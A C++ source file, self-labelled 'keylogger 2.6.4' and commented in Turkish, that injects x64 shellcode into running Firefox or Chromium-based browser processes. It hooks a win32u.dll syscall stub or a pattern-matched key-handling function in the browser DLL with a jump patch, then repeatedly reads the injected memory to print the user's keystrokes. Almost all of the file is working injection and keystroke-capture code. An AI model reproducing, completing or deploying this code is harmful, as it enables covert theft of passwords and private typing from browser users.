#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

#include <D:\!!!Belgeler\visual studio\WatermarkRem\WatermarkRem\PatternSearch.h>;


typedef struct shellcodeStack {
    DWORD64 DosHeader;                  // 0x00
    DWORD64 ImportDescriptor;           // 0x08
    DWORD64 OriginalFuncAddr;           // 0x10
    DWORD64 FirstThunk;                 // 0x18
    DWORD64 OriginalFirstThunk;         // 0x20
    DWORD64 oldProtect;                 // 0x28
    DWORD64 VirtualProtectAddr;         // 0x30
    DWORD64 OGreturnAddr;               // 0x38
    DWORD64 hCreateFileW;               // 0x40
    DWORD64 hWriteFile;                 // 0x48
    DWORD64 pMSG;                       // 0x50
    DWORD64 hKernel32;                  // 0x58
    DWORD64 ExportedFuncNum;            // 0x60
    DWORD64 ExportedFunctionsTable;     // 0x68
    DWORD64 addressOfNamePointer;       // 0x70
    DWORD64 addressOfOrdinalTable;      // 0x78
    DWORD64 hGetProcAddress;            // 0x80
    DWORD64 firstReturnAddr;            // 0x88
    DWORD64 bytesWritten;               // 0x90
    DWORD64 AsciiValue;                 // 0x98
    //burdan sonrasý deneysel alan
    DWORD64 hLoadLibraryA;//0xA0
    //deneysel alan bitiþi string sahasý
    char USER32String[11];              // 0x100
    char GetMessageWString[12];         // 0x110 buraya faklý biþey gelebilir hooklanacak fonk bu ondan 0x20(32) bayt fazlasý var
    char VirtualProtectString[15];      // 0x130
    char KERNEL32String[13];            // 0x140
    char CreateFileWString[13];         // 0x150
    char WriteFileString[10];           // 0x160
    char LoadLibraryAString[12];        // 0x170
    char GetProcAddressString[15];      // 0x180
    char PipeNameString[1];             // 0x190

    long stack;                         // 0x1B0

};



bool SearchFile(const wchar_t* directory, const wchar_t* targetFileName, wchar_t* foundPath, size_t foundPathSize) {
    wchar_t searchPath[MAX_PATH];
    wcscpy_s(searchPath, directory);
    wcscat_s(searchPath, L"\\*");

    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath, &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return false;
    }

    bool found = false;

    do {
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
            continue;

        wchar_t fullPath[MAX_PATH];
        wcscpy_s(fullPath, directory);
        wcscat_s(fullPath, L"\\");
        wcscat_s(fullPath, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Alt dizin
            if (SearchFile(fullPath, targetFileName, foundPath, foundPathSize)) {
                found = true;
                break;
            }
        }
        else {
            if (wcscmp(findData.cFileName, targetFileName) == 0) {
                wcsncpy_s(foundPath, foundPathSize, fullPath, _TRUNCATE);
                found = true;
                break;
            }
        }

    } while (FindNextFileW(hFind, &findData) != 0);

    FindClose(hFind);
    return found;
}




unsigned long getPID(wchar_t* ProcessName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Ýlk iþlemi al
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // Ýþlem adýný ve PID'yi yazdýr
            std::wcout << L"Process: " << pe32.szExeFile << L" | PID: " << pe32.th32ProcessID << std::endl;
            if (wcscmp(ProcessName, pe32.szExeFile) == 0) {
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32)); // Sonraki iþlemi al
    }

    else {
        std::cerr << "Process32First baþarýsýz oldu!" << std::endl;
    }

    // Anlýk görüntüyü serbest býrak
    CloseHandle(hSnapshot);

    return 0;
}



size_t ShellcodeByteSize = 138;

typedef struct PIDS {
    size_t size;
    unsigned long* pids;
}PIDS, * PPIDS;

typedef struct MEMREADPARAMS {
    unsigned long long pMemAllocatedSpace;
    HANDLE hProcessMem;
}MEMREADPARAMS, * PMEMREADPARAMS;


PIDS getMultiplePIDS(wchar_t* ProcessName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    PIDS pids;
    pids.size = 0;

    size_t processCounter = 0;

    // Ýlk iþlemi al
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // Ýþlem adýný ve PID'yi yazdýr
            std::wcout << L"Process: " << pe32.szExeFile << L" | PID: " << pe32.th32ProcessID << std::endl;
            if (wcscmp(ProcessName, pe32.szExeFile) == 0) {
                ++processCounter;
            }
        } while (Process32Next(hSnapshot, &pe32)); // Sonraki iþlemi al
    }
    else {
        std::cerr << "Process32First baþarýsýz oldu!" << std::endl;
    }

    if (processCounter == 0) {
        CloseHandle(hSnapshot);
        return pids;
    }

    pids.size = processCounter;
    unsigned long* pPids = (unsigned long*)malloc(processCounter * sizeof(unsigned long));

    size_t counter = 0;
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (wcscmp(ProcessName, pe32.szExeFile) == 0) {
                pPids[counter] = pe32.th32ProcessID;
                ++counter;
            }
        } while (Process32Next(hSnapshot, &pe32)); // Sonraki iþlemi al
    }

    else {
        std::cerr << "Process32First baþarýsýz oldu!" << std::endl;
        pids.size = 0;
        return pids;
    }

    pids.pids = pPids;
    // Anlýk görüntüyü serbest býrak
    CloseHandle(hSnapshot);

    return pids;
}

void memReadAll(PMEMREADPARAMS params, size_t procSize, size_t readOffset, size_t readSize) {

    unsigned char* readValue = (unsigned char*)malloc(readSize);
    SIZE_T byteRead;
    MEMREADPARAMS param;
    size_t procNum = 0;

    while (true) {
        param = params[procNum];
        ReadProcessMemory(param.hProcessMem, LPVOID(param.pMemAllocatedSpace + readOffset), readValue, readSize, &byteRead);

        std::cout << readValue << "\n";
        
        ++procNum;
        if (procNum == procSize) {
            procNum = 0;
            std::cout << "devam?";
            system("pause");
        }
    }
}


void memReadLoopTemp(PMEMREADPARAMS params, size_t procSize, size_t readOffset) {

    unsigned long long value[2] = { 0, 0 };
    SIZE_T byteRead;

    MEMREADPARAMS param;
    //unsigned long long readAddress = (unsigned long long)pMemAllocatedSpace + 0x77;//0x79
    //LPVOID pReadAddress = (LPVOID)readAddress;

    unsigned long* keepCounter = (unsigned long*)malloc(procSize * sizeof(unsigned long));
    unsigned long* TimerAmnesia = (unsigned long*)malloc(procSize * sizeof(unsigned long));    //arada okunmamýþ basýmlar var mý onun kontrolü 0 harici kaç adet olduðudur
    memset(keepCounter, 0x00, procSize * sizeof(unsigned long));
    memset(TimerAmnesia, 0xFF, procSize * sizeof(unsigned long));

    SHORT capsLockState = GetKeyState(VK_CAPITAL); //capslock kontrol
    size_t procNum = 0;
    bool isIntMiddle = false;

    while (true) {
        param = params[procNum];
        ReadProcessMemory(param.hProcessMem, LPVOID(param.pMemAllocatedSpace + readOffset), &value, sizeof(value), &byteRead);

        
        //std::cout << value[0] << value[1] << "\n";
        if (value[1] != (keepCounter[procNum])) {
            
            TimerAmnesia[procNum] = value[1] - keepCounter[procNum];
            if (TimerAmnesia[procNum] == 1) {
                ++keepCounter[procNum];
                if (isIntMiddle == true) {
                    isIntMiddle = false;
                    continue;
                }
                isIntMiddle = true;
            }
            else if (TimerAmnesia[procNum] == 2) {
                keepCounter[procNum]+=2;
            }
            else {
                for (size_t i = 0; i < TimerAmnesia[procNum]; i++) {
                    printf("[?]");
                }
                keepCounter[procNum] = value[1];
                continue;
            }
            
            switch (value[0])
            {
            case 0x08: std::cout << '\b' << ' ' << '\b'; //backspace
                break;
            case 0x09: std::cout << '\t';//tab
                break;
            case 0x0D: std::cout << '\n';//enter
                break;
            case 0x10: std::cout << '^';//shift
                break;
            case 0x11: std::cout << '!';//CTRL
                break;
            case 0x2E: //delete
                break;
            case 0x14: capsLockState = GetKeyState(VK_CAPITAL); //capslock
                break;
            case 0x20: std::cout << ' ';//space
                break;
            default: std::cout << (char)value[0];
                break;
            }
            
        }
        ++procNum;
        if (procNum == procSize) {
            procNum = 0;
        }
        Sleep(3);
    }
}


void memReadLoop(PMEMREADPARAMS params, size_t procSize, size_t readOffset) {
    
    unsigned long long value[2] = { 0, 0 };
    SIZE_T byteRead;

    MEMREADPARAMS param;
    //unsigned long long readAddress = (unsigned long long)pMemAllocatedSpace + 0x77;//0x79
    //LPVOID pReadAddress = (LPVOID)readAddress;

    unsigned long* keepCounter = (unsigned long*)malloc(procSize * sizeof(unsigned long));
    unsigned long* TimerAmnesia = (unsigned long*)malloc(procSize*sizeof(unsigned long));    //arada okunmamýþ basýmlar var mý onun kontrolü 0 harici kaç adet olduðudur
    memset(keepCounter, 0x00, procSize * sizeof(unsigned long));
    memset(TimerAmnesia, 0xFF, procSize * sizeof(unsigned long));

    SHORT capsLockState = GetKeyState(VK_CAPITAL); //capslock kontrol
    size_t procNum = 0;

    while (true) {
        param = params[procNum];
        ReadProcessMemory(param.hProcessMem, LPVOID(param.pMemAllocatedSpace + readOffset), &value, sizeof(value), &byteRead);
        //std::cout << value[0] << value[1] << "\n";
        if (value[1] != (keepCounter[procNum])) {
            TimerAmnesia[procNum] = value[1] - keepCounter[procNum] - 0x01;   //0x02 deðeri GetMessageW olacaðý zaman 0x01 olmalý
            if (TimerAmnesia[procNum] != 0x00000000) {
                value[0] = '?';
            }

            switch (value[0])
            {
            case 0x08: std::cout << '\b' << ' ' << '\b'; //backspace
                break;
            case 0x09: std::cout << '\t';//tab
                break;
            case 0x0D: std::cout << '\n';//enter
                break;
            case 0x10: std::cout << '^';//shift
                break;
            case 0x11: std::cout << '!';//CTRL
                break;
            case 0x2E: //delete
                break;
            case 0x14: capsLockState = GetKeyState(VK_CAPITAL); //capslock
                break;
            case 0x20: std::cout << ' ';//space
                break;
            default: std::cout << (char)value[0];
                break;
            }
            ++keepCounter[procNum];
        }
        ++procNum;
        if (procNum == procSize) {
            procNum = 0;
        }
        Sleep(10);
    }
}


unsigned char* GetWin32uAddr(DWORD pid) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snapshot == INVALID_HANDLE_VALUE) {
        //std::cerr << "Snapshot alýnamadý: " << GetLastError() << "\n";
        return 0x0000000000000000;
    }

    MODULEENTRY32 me32 = { sizeof(MODULEENTRY32) };
    if (Module32First(snapshot, &me32)) {
        do {
            if (_wcsicmp(me32.szModule, L"Win32u.dll") == 0) {
                std::wcout << L"Modul: " << me32.szModule
                    << L" | Base: " << me32.modBaseAddr
                    << L" | Size: " << me32.modBaseSize << L"\n";
                return me32.modBaseAddr;
            }
        } while (Module32Next(snapshot, &me32));
    }
    else {
        //std::cerr << "Module32First baþarýsýz: " << GetLastError() << "\n";
    }

    CloseHandle(snapshot);

    return 0x0000000000000000;
}


MEMREADPARAMS patchFunc(unsigned long offset, unsigned long pid) {
    
    MEMREADPARAMS memreadparams;
    memreadparams.hProcessMem = nullptr;
    memreadparams.pMemAllocatedSpace = NULL;

    unsigned char shellcode[] = { 0x53, 0x51, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0xB8, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x29, 0xC3, 0x48, 0x83, 0xC3, 0x05, 0x48, 0x81, 0xC3, 0x8A, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x08, 0x48, 0x3D, 0x00, 0x01, 0x00, 0x00, 0x74, 0x38, 0x48, 0x83, 0xF8, 0x65, 0x74, 0x32, 0x48, 0x3D, 0x02, 0x01, 0x00, 0x00, 0x74, 0x2A, 0x48, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x74, 0x22, 0x48, 0x3D, 0x04, 0x01, 0x00, 0x00, 0x74, 0x1A, 0x48, 0x3D, 0x05, 0x01, 0x00, 0x00, 0x74, 0x12, 0x48, 0x3D, 0x06, 0x01, 0x00, 0x00, 0x74, 0x0A, 0x48, 0x3D, 0x07, 0x01, 0x00, 0x00, 0x74, 0x02, 0xEB, 0x0C, 0x48, 0x8B, 0x49, 0x10, 0x48, 0x89, 0x4B, 0x20, 0x48, 0xFF, 0x43, 0x28, 0x59, 0x5B, 0x48, 0xB8, 0x21, 0x43, 0x65, 0x87, 0x78, 0x56, 0x34, 0x12, 0x48, 0xB8, 0x65, 0x87, 0x78, 0x56, 0x34, 0x12, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90,
        //buradan sonrasýna OG instruction gelecek
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        //0x17(23) bayt 
        //sonrasý pHeap
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

    };

    unsigned char patch[] = { 0x48 ,0xb8 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00, 0xff, 0xe0 }; //mov rax,???;jmp rax
    size_t patchBufferSize = sizeof(patch);

    unsigned char* win32uAddr = GetWin32uAddr(pid);
    if (win32uAddr == 0x0000000000000000) {
        return memreadparams;
    }
 
    unsigned char* patchAddr = win32uAddr + offset;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        //std::cerr << "OpenProcess failed: " << GetLastError() << "\n";
        return memreadparams;
    }


    LPVOID pAllocatedSpace = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pAllocatedSpace) {
        printf("Bellek tahsisi :(\n");
        CloseHandle(hProcess);
        return memreadparams;
    }

    *(unsigned long long*)(patch+2) = (unsigned long long)pAllocatedSpace;

    //ReadProcessMemory(hProcessMem, patchAddr, &value, 0x18, &byteRead);
    memcpy((shellcode+ShellcodeByteSize-24), patchAddr, 0x18);

    WriteProcessMemory(hProcess, pAllocatedSpace, shellcode, sizeof(shellcode), NULL);

    std::cout << "pid: " << pid << "address: " << std::hex << pAllocatedSpace << "\n";

    LPVOID targetAddress = (LPVOID)patchAddr; // örnek adres
    //std::cout << "target address: " << targetAddress << "\n";

    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, targetAddress, patchBufferSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        //std::cerr << "VirtualProtectEx failed: " << GetLastError() << "\n";
        return memreadparams;
    }

    // Belleðe yaz
    if (!WriteProcessMemory(hProcess, targetAddress, patch, patchBufferSize, nullptr)) {
        //std::cerr << "WriteProcessMemory failed: " << GetLastError() << "\n";
        return memreadparams;
    }

    // Koruma geri alýnýr
    VirtualProtectEx(hProcess, targetAddress, patchBufferSize, oldProtect, &oldProtect);

    memreadparams.pMemAllocatedSpace = (unsigned long long)pAllocatedSpace;
    memreadparams.hProcessMem = hProcess;

    return memreadparams;
}


MEMREADPARAMS patchFuncChromium(unsigned long pid, unsigned long long* patchAddr, unsigned char* shellcode, size_t shellcodeSize) {

    MEMREADPARAMS memreadparams;
    memreadparams.hProcessMem = nullptr;
    memreadparams.pMemAllocatedSpace = NULL;

    unsigned char patch[] = { 0x48 ,0xb8 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00, 0xff, 0xe0 }; //mov rax,???;jmp rax
    size_t patchBufferSize = sizeof(patch);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        //std::cerr << "OpenProcess failed: " << GetLastError() << "\n";
        return memreadparams;
    }


    LPVOID pAllocatedSpace = VirtualAllocEx(hProcess, NULL, shellcodeSize+0x255, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pAllocatedSpace) {
        printf("Bellek tahsisi :(\n");
        CloseHandle(hProcess);
        return memreadparams;
    }

    *(unsigned long long*)(patch + 2) = (unsigned long long)pAllocatedSpace;

    WriteProcessMemory(hProcess, pAllocatedSpace, shellcode, shellcodeSize, NULL);

    std::cout << "pid: " << pid << "address: " << std::hex << pAllocatedSpace << "\n";

    LPVOID targetAddress = (LPVOID)patchAddr; // örnek adres
    //std::cout << "target address: " << targetAddress << "\n";

    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, targetAddress, patchBufferSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        //std::cerr << "VirtualProtectEx failed: " << GetLastError() << "\n";
        return memreadparams;
    }

    // Belleðe yaz
    if (!WriteProcessMemory(hProcess, targetAddress, patch, patchBufferSize, nullptr)) {
        //std::cerr << "WriteProcessMemory failed: " << GetLastError() << "\n";
        return memreadparams;
    }

    // Koruma geri alýnýr
    VirtualProtectEx(hProcess, targetAddress, patchBufferSize, oldProtect, &oldProtect);

    memreadparams.pMemAllocatedSpace = (unsigned long long)pAllocatedSpace;
    memreadparams.hProcessMem = hProcess;

    return memreadparams;
}


unsigned long long getFuncOffset() {

    char patternStr[] = "4c 8b d1 b8 01 10 00 00 f6 04 25 ?? ?? ?? ?? ?? 75 03 0f 05 c3";

    HMODULE hModule = LoadLibraryA("win32u.dll");

    if (!hModule) {
        //std::cerr << "Modül bulunamadý: " << shell32path << "\n";
        return -1;
    }

    // PE header üzerinden boyutu öðreniyoruz
    auto base = reinterpret_cast<BYTE*>(hModule);
    auto dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dosHeader->e_lfanew);
    DWORD baseSize = ntHeaders->OptionalHeader.SizeOfImage;

    size_t maxPattern = 3;

    unsigned long long* patternAddress = (unsigned long long*)patternSearch(base, baseSize, patternStr, maxPattern);

    for (size_t i = 0; i < maxPattern; i++) {
        if (*(patternAddress + i) == 0xCDCDCDCDCDCDCDCD) {
            break;
        }

        unsigned long long address = *(patternAddress + i);
        unsigned long long offset = address - (unsigned long long)hModule;
        //std::cout << "address | offset: " << std::hex << address << " | " << offset << "\n";
        return offset;
    }

    free(patternAddress);
    FreeLibrary(hModule);
    return -1;
}


unsigned long long* getChromiumKeyFunc(unsigned long pid, wchar_t* dllName) {

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0x0000000000000000;
    }

    MODULEENTRY32 me32 = { sizeof(MODULEENTRY32) };
    if (Module32First(snapshot, &me32)) {
        do {
            
            if (_wcsicmp(me32.szModule, dllName) == 0) {
                std::wprintf(L"%s bulundu harika lowdword->0x%X. - %d byte\n", me32.szModule, me32.modBaseAddr, me32.modBaseSize);

                std::wcout << L"Modul: " << me32.szModule
                    << L" | Base: " << me32.modBaseAddr
                    << L" | Size: " << me32.modBaseSize << L"\n";
                
                unsigned long long* pDll = (unsigned long long*)malloc(me32.modBaseSize);

                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                size_t byteRead;
                ReadProcessMemory(hProcess, me32.modBaseAddr, pDll, me32.modBaseSize, &byteRead);
                printf("%d byte okundu", byteRead);

                char patternStr[] = "41 56 56 57 53 48 83 ec 28 4c 89 c6 89 d7 48 89 cb e8 ?? ?? ?? ?? 49 89 c6 31 c9 ff ?? ?? ?? ?? ?? 4c 89 f1 48 89 c2 e8 ?? ?? ?? ?? 4c 89 f1 48 89 da 41 89 f8 49 89 f1 e8 ?? ?? ?? ?? 48 89 d8 48 83 c4 28 5b 5f 5e 41 5e c3";

                size_t maxPattern = 3;

                unsigned long long* patternAddress = (unsigned long long*)patternSearch(pDll, byteRead, patternStr, maxPattern);

                for (size_t i = 0; i < maxPattern; i++) {
                    if (*(patternAddress + i) == 0xCDCDCDCDCDCDCDCD) {
                        break;
                    }
                    unsigned long long offset = *(patternAddress + i) - (unsigned long long)pDll;
                    unsigned long long baseAddress = (unsigned long long)me32.modBaseAddr + offset;
                    std::cout << "address | offset: " << std::hex << baseAddress << " | " << offset << "\n";

                    CloseHandle(hProcess);
                    free(patternAddress);
                    free(pDll);

                    return (unsigned long long*)baseAddress;
                }

                //unsigned long long address = 0x00007ffdf1ce53aa;
                //patchFuncChromium(pid, (unsigned long long*)address, shellcode, shellcodeSize);

                return 0x0000000000000000;
            }
        } while (Module32Next(snapshot, &me32));
    }

    CloseHandle(snapshot);
}


int wmain(int argc, wchar_t* argv[]) {

    std::cout << "keylogger 2.6.4!\n";
    unsigned long inputPid = 0;
    wchar_t* inputName = nullptr;
    PIDS pid;
    bool isChromium = true;
    
    if (argc < 3) {
        std::wcout << L"Kullanim:\n"
            << L"  program.exe -p <pid>\n"
            << L"  program.exe -i <isim> [-m]\n";
        return 1;
    }

    if (wcscmp(argv[1], L"-p") == 0) {
        inputPid = _wtoi(argv[2]);
        std::wcout << L"Pid alindi: " << inputPid << L"\n";
        pid.pids = &inputPid;
        pid.size = 1;
    }
    else if (wcscmp(argv[1], L"-i") == 0) {
        inputName = argv[2];
        std::wcout << L"Ýsim alindi: " << inputName << L"\n";
        
        if (argc >= 4 && wcscmp(argv[3], L"-m") == 0) {
            pid = getMultiplePIDS(inputName);
            if (pid.size == 0) {
                CloseHandle(pid.pids);
                std::cout << "hata oldu ciktim bb\n";
                return 0;
            }
        }
        else {
            unsigned long PID = getPID(inputName);
            if (!PID) {
                std::cout << "pid de bi sikinti oldu\n";
                return 0;
            }
            pid.pids = &PID;
            pid.size = 1;
        }
    }
    else if (wcscmp(inputName, L"firefox.exe") == 0) {
        isChromium = false;
    }

    else {
        std::wcout << L"Geçersiz parametre.\n";
        return 1;
    }

    if (isChromium == false) {
        unsigned long long offset = getFuncOffset();

        PMEMREADPARAMS pParams = (PMEMREADPARAMS)malloc(pid.size * sizeof(MEMREADPARAMS));
        MEMREADPARAMS param;

        size_t patchedCounter = 0;
        for (size_t i = 0; i < pid.size; i++) {
            param = patchFunc(offset, pid.pids[i]);
            if (param.hProcessMem == nullptr || param.pMemAllocatedSpace == NULL) {
                continue;
            }
            pParams[i] = param;
            printf("%d. patch basarili\n", i);
            ++patchedCounter;
        }
        size_t readOffset = ShellcodeByteSize + 0x25;
        memReadLoop(pParams, patchedCounter, readOffset);

        //CloseHandle(hProcessMem);
    }
   
    //firefox deðilse chromium tabanlý kabul ediliyor
    
    else {
        //burayý pid girilirse otomatik alsýn yoksa problem oluyor
        wchar_t* inputDll = (wchar_t*)malloc((wcslen(inputName) * 2) + 2);

        //chrome.exe yi chrome.dll yapma
        for (int i = 0; inputName[i] != '\0'; ++i) {
            inputDll[i] = inputName[i];

            if (inputName[i] == '.') {
                inputDll[i + 1] = 'd';
                inputDll[i + 2] = 'l';
                inputDll[i + 3] = 'l';
                inputDll[i + 4] = 0x00;

                break;
            }
        }

        //unsigned long pid = 26968;
        /*
        unsigned char shellcode[] = { 0x53, 0x51, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0xB9, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x29, 0xCB, 0x48, 0x81, 0xC3, 0x7E, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x89, 0x43, 0x10, 0x48, 0x89, 0xD8, 0x48, 0x2D, 0x7E, 0x00, 0x00, 0x00, 0x48, 0x05, 0x4C, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x03, 0x59, 0x5B, 0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x4C, 0x89, 0xC6, 0xFF, 0xE0, 0x50, 0x53, 0x51, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0xB9, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x29, 0xCB, 0x48, 0x81, 0xC3, 0x7E, 0x00, 0x00, 0x00, 0x8A, 0x08, 0x88, 0x4B, 0x20, 0x48, 0xFF, 0x43, 0x28, 0x48, 0x8B, 0x4B, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x10, 0x59, 0x5B, 0xC3,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // dönüþ adresi yazýlacak
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        };*/
        unsigned char shellcode[] = { 0x53, 0x51, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0xB9, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x29, 0xCB, 0x48, 0x81, 0xC3, 0x94, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x89, 0x43, 0x10, 0x48, 0x89, 0xD8, 0x48, 0x2D, 0x94, 0x00, 0x00, 0x00, 0x48, 0x05, 0x4C, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x03, 0x59, 0x5B, 0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x4C, 0x89, 0xC6, 0xFF, 0xE0, 0x50, 0x50, 0x53, 0x51, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0xB9, 0x55, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x29, 0xCB, 0x48, 0x81, 0xC3, 0x94, 0x00, 0x00, 0x00, 0x8A, 0x00, 0x88, 0x43, 0x20, 0x48, 0xFF, 0x43, 0x28, 0x48, 0x8B, 0x4B, 0x28, 0x48, 0xF7, 0xC1, 0x01, 0x00, 0x00, 0x00, 0x75, 0x07, 0x48, 0xD1, 0xE9, 0x88, 0x44, 0x0B, 0x30, 0x48, 0x8B, 0x4B, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x18, 0x59, 0x5B, 0x58, 0xC3,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // dönüþ adresi yazýlacak
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

        };

        size_t shellcodeSize = sizeof(shellcode);

        PMEMREADPARAMS pParams = (PMEMREADPARAMS)malloc(pid.size * sizeof(MEMREADPARAMS));
        MEMREADPARAMS param;
        unsigned long long* targetAddress = nullptr;

        size_t patchedCounter = 0;
        for (size_t i = 0; i < pid.size; i++) {
            targetAddress = getChromiumKeyFunc(pid.pids[i], inputDll);
            if (targetAddress != nullptr) {
                break;
            }
        }

        for (size_t i = 0; i < pid.size; i++) {
            //unsigned long long* targetAddress = getChromiumKeyFunc(pid.pids[i], inputDll);
            if (targetAddress == 0x0000000000000000) {
                continue;
            }

            *(unsigned long long*)(shellcode + shellcodeSize - 0x18) = (unsigned long long)targetAddress + 0x0C;
            //patchFuncChromium(pid.pids[i], targetAddress, shellcode, shellcodeSize);
            
            param = patchFuncChromium(pid.pids[i], targetAddress, shellcode, shellcodeSize);
            if (param.hProcessMem == nullptr || param.pMemAllocatedSpace == NULL) {
                continue;
            }
            pParams[patchedCounter] = param;
            printf("\n%d. patch basarili\n", i);
            ++patchedCounter;
        }
        size_t readOffset = shellcodeSize+0x08;
        if (patchedCounter > 0) {
            memReadLoopTemp(pParams, patchedCounter, readOffset);
            //memReadAll(pParams, patchedCounter, shellcodeSize + 0x19,255);
        }
        //free(inputDll);
    }

    

    return 0;
}
